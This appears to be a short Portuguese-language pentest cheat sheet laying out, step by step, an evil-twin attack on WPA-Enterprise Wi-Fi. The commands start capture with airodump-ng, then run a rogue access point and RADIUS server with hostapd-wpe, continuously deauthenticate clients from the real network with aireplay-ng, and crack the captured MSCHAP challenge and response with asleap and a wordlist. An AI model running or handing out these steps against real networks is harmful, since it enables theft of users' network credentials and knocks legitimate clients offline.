# Usar duas placas em modo de monitoramento para aumentar performance.
airodump-ng [interface 1] --essid [SSID da rede] -w [Arquivo de saída] --output-form netxml --write-interval 5

# Iniciar Access Point Falso com servidor Radius:
# Configurar em /etc/hostapd-wpe/hostapd-wpe.conf
# Usar interface 2:
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Deautenticar clientes na rede original:
aireplay-ng -0 0 -a [BSSID alvo] [interface 2]

# Capturar challenges e responses, interromper capturas.
# Quebrar dados coletados:
asleap -C [Challenge] -R [Response] -W [wordlist]
